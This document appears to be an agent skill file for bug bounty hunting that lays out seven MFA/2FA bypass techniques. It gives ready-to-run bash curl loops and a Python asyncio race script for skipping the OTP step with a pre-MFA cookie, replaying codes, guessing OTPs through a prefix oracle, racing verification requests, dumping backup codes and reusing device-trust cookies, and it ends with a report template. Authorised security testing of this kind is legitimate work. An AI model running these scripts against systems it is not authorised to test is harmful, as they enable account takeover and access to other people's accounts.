---
name: k1nzr3c0n-hunt-mfa-bypass
description: "Hunt MFA/2FA bypass — 7 patterns: (1) skip MFA step via direct URL, (2) OTP replay (reuse consumed code), (3) wrong OTP accepted / client-side check, (4) prefix oracle (collapse 1M brute to 60 guesses), (5) race condition on OTP verify (30 concurrent HTTP/2), (6) backup code dump via /api/me, (7) device trust not bound to IP/UA. Chain: cookie theft + password oracle + no MFA step-up = ATO."
tags: [mfa, 2fa, bypass, ato, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — MFA/2FA Bypass

> **Priority**: try workflow bypasses before any brute force — faster and more likely.
> **Proof needed**: attacker session accessing post-MFA resource without completing MFA.

---

## Autonomous Testing Priority

Try in this order (fastest to slowest):
1. Skip MFA step entirely → direct URL access
2. OTP replay (reuse same code after logout/login)
3. Submit obviously wrong OTP → observe response
4. Prefix oracle (collapse brute force to ≤60 guesses)
5. Race condition on OTP verification
6. Backup code dump via profile API
7. Device trust cookie reuse from new IP/browser

---

## Phase 0 — Map MFA Flow

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_mfa_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
SESSION="${SESSION_COOKIE:-}"

echo "=== MFA Endpoint Discovery ==="
# From recon URL list
grep -iE '/(mfa|2fa|otp|verify|totp|authenticat|factor|challenge)' \
  /tmp/recon_*/endpoints/all_urls.txt 2>/dev/null | sort -u | head -20 | sed 's/^/  /'

echo ""
echo "Burp flow trace:"
echo "  1. Login → intercept 'pre-MFA' session state (cookie before /mfa)"
echo "  2. Note: /mfa endpoint, OTP verify endpoint, success redirect"
echo "  3. Check: is MFA enforced by middleware (all routes) or per-endpoint (just /mfa)?"
```

## Phase 1 — Pattern 1: Skip MFA Step

```bash
echo "=== Pattern 1: Skip MFA Step (most common) ==="
BASE="https://${TARGET}"
PRE_MFA_COOKIE="${PRE_MFA_COOKIE:-SESSION_BEFORE_MFA}"

echo "After entering password, get the pre-MFA cookie, then:"
echo ""
# Test direct access to post-login resources without completing MFA
for RESOURCE in /dashboard /api/me /account /profile /home /app /settings; do
  RESP=$(curl -sk -b "session=${PRE_MFA_COOKIE}" "${BASE}${RESOURCE}" -w "\n%{http_code}" 2>/dev/null)
  STATUS=$(echo "$RESP" | tail -1)
  BODY=$(echo "$RESP" | head -1)
  
  if [ "$STATUS" = "200" ] && echo "$BODY" | grep -iqE '"user"|"email"|"account"|"name"'; then
    echo "  [VULNERABLE] MFA skippable via direct access to: $RESOURCE"
    echo "  Response preview: ${BODY:0:100}"
  else
    echo "  [$STATUS] $RESOURCE — not bypassed"
  fi
done

echo ""
echo "  If 200 + user data returned → MFA is enforced only in UI, not server-side → CRITICAL"
```

## Phase 2 — Pattern 2: OTP Replay

```bash
echo "=== Pattern 2: OTP Replay ==="
OTP_ENDPOINT="${OTP_ENDPOINT:-/api/mfa/verify}"
BASE="https://${TARGET}"

echo "Steps:"
echo "  1. Login → get valid OTP (from authenticator/SMS)"
echo "  2. Complete MFA successfully (confirm it works)"
echo "  3. Logout completely"
echo "  4. Login again with same credentials"
echo "  5. Submit the SAME OTP code again"
echo ""
echo "Test:"
curl -sk -X POST "${BASE}${OTP_ENDPOINT}" \
  -H "Content-Type: application/json" \
  -b "session=${SESSION}" \
  -d '{"otp":"PREVIOUSLY_USED_OTP_HERE"}' | head -3
echo ""
echo "  [VULNERABLE] if response is success (200 / token returned)"
echo "  [SECURE] if response is error (invalid/expired/already-used)"
```

## Phase 3 — Pattern 3: Wrong OTP Accepted

```bash
echo "=== Pattern 3: Wrong OTP / Client-Side Check ==="
BASE="https://${TARGET}"

for WRONG_OTP in "000000" "123456" "111111" "000001" "999999"; do
  STATUS=$(curl -sk -X POST "${BASE}${OTP_ENDPOINT:-/api/mfa/verify}" \
    -H "Content-Type: application/json" \
    -b "session=${SESSION}" \
    -d "{\"otp\":\"${WRONG_OTP}\"}" -o /dev/null -w '%{http_code}')
  echo "  OTP $WRONG_OTP → HTTP $STATUS"
done

echo ""
echo "Also test response manipulation (Burp):"
echo "  1. Submit wrong OTP → capture response"
echo '  2. Change {"success":false} → {"success":true} (or 401 → 200)'
echo "  3. Forward — if app proceeds → client-side only MFA → CRITICAL"
```

## Phase 4 — Pattern 4: Prefix Oracle

```bash
echo "=== Pattern 4: Prefix Oracle (collapse 1M to ≤60 guesses) ==="
echo ""
echo "CRITICAL — stay in ONE session. Do NOT re-login (that regenerates OTP)."
echo ""
echo "How prefix oracle works:"
echo "  Submit 1 digit: otp=0, otp=1, ..., otp=9"
echo "  If a CORRECT prefix gives different response (body/status/timing) → oracle confirmed"
echo "  Walk digit-by-digit keeping the 'correct' prefix"
echo "  Result: 6-digit code cracked in ≤60 attempts instead of 1,000,000"
echo ""

OTP_ENDPOINT="${OTP_ENDPOINT:-/api/mfa/verify}"
BASE="https://${TARGET}"
CONTROL=$(curl -sk -X POST "${BASE}${OTP_ENDPOINT}" \
  -H "Content-Type: application/json" \
  -b "session=${SESSION}" \
  -d '{"otp":"999999"}' 2>/dev/null)
echo "  Control response (wrong OTP): ${CONTROL:0:80}"

echo ""
echo "  Testing prefix 0-9:"
for D in 0 1 2 3 4 5 6 7 8 9; do
  RESP=$(curl -sk -X POST "${BASE}${OTP_ENDPOINT}" \
    -H "Content-Type: application/json" \
    -b "session=${SESSION}" \
    -d "{\"otp\":\"${D}\"}" 2>/dev/null)
  [ "$RESP" != "$CONTROL" ] && echo "    [DIFF] prefix=$D → oracle candidate" || echo "    [SAME] prefix=$D"
done
```

## Phase 5 — Pattern 5: Race Condition on OTP

```bash
echo "=== Pattern 5: OTP Race Condition ==="
echo "Fire 30 concurrent verifications of SAME OTP before server marks it used"
echo "2 concurrent = usually resolved sequentially (false negative). Need 20+."
echo ""

cat > /tmp/mfa_race.py << 'PYEOF'
import asyncio, aiohttp, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "target.com"
OTP_ENDPOINT = "/api/mfa/verify"
SESSION = "YOUR_PRE_MFA_SESSION"
OTP = "123456"

async def verify(session):
    try:
        async with session.post(
            f"https://{TARGET}{OTP_ENDPOINT}",
            json={"otp": OTP},
            headers={"Content-Type": "application/json"}
        ) as r:
            return r.status, await r.text()
    except Exception as e:
        return 0, str(e)

async def race():
    cookies = {"session": SESSION}
    async with aiohttp.ClientSession(cookies=cookies) as s:
        results = await asyncio.gather(*[verify(s) for _ in range(30)])
        successes = [(st, body) for st, body in results if st == 200 and "success" in body.lower()]
        print(f"[+] {len(successes)}/30 succeeded — race window: {'CONFIRMED' if len(successes) > 1 else 'NOT FOUND'}")

asyncio.run(race())
PYEOF
echo "  python3 /tmp/mfa_race.py ${TARGET}"
echo "  Better: use Turbo Intruder → HTTP/2 single-packet attack for lowest jitter"
```

## Phase 6 — Pattern 6: Backup Code Dump

```bash
echo "=== Pattern 6: Backup Code Dump via /api/me ==="
BASE="https://${TARGET}"

# Test if backup codes are exposed in profile response (with any valid auth)
PROFILE=$(curl -sk "${BASE}/api/me" -H "Authorization: Bearer ${AUTH_TOKEN:-}" | head -1)
echo "  Profile response: ${PROFILE:0:200}"
echo "$PROFILE" | grep -i 'backup\|recovery\|code\|mfa_codes\|totp' | sed 's/^/  [BACKUP-CODES?] /'

echo ""
echo "Also check: /api/user, /api/account, /api/profile, /api/v1/me"
echo "Look for: backup_codes[], recovery_codes[], mfa_recovery"
echo "If present → ANY authenticated user (even via XSS) can exfil backup codes → CRITICAL"
```

## Phase 7 — Pattern 7: Device Trust Reuse

```bash
echo "=== Pattern 7: Device Trust Cookie ==="
echo ""
echo "Steps:"
echo "  1. Complete MFA once on Device A (attacker browser)"
echo "  2. Note the 'remember this device' cookie value"
echo "  3. Present that cookie from NEW IP/browser/UA"
echo "  4. If MFA is skipped → device trust not bound to IP/UA → ATO"
echo ""
echo "  Common cookie names: device_token, trusted_device, mfa_remembered, device_id"
echo "  Test: copy cookie to new session; clear other cookies"
```

## Gate 0

```bash
echo "=== MFA Bypass Gate 0 ==="
echo "  □ Skip: post-MFA resource returns 200 + user data with pre-MFA cookie"
echo "  □ Replay: same OTP accepted in fresh login session"
echo "  □ Wrong OTP: accepted without error / response manipulation works"
echo "  □ Prefix oracle: different response on correct prefix vs wrong prefix"
echo "  □ Race: >1 success in 30 concurrent submissions"
echo "  □ Backup codes: exposed in /api/me response"
echo "  □ Device trust: MFA skipped from new IP with remembered cookie"
echo ""
echo "  SEVERITY: standalone MFA bypass = High; MFA bypass + password oracle = Critical"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
MFA step skip on [target.com]: pre-MFA session cookie allows direct access to /dashboard without completing OTP challenge — MFA enforced only client-side → CRITICAL
OTP replay on [/api/mfa/verify]: same 6-digit code accepted in new session after logout → persistent MFA bypass → HIGH
Backup code exposure via [/api/me]: authenticated response includes plaintext backup_codes[] array → any XSS or IDOR leaks permanent MFA bypass codes → CRITICAL
```
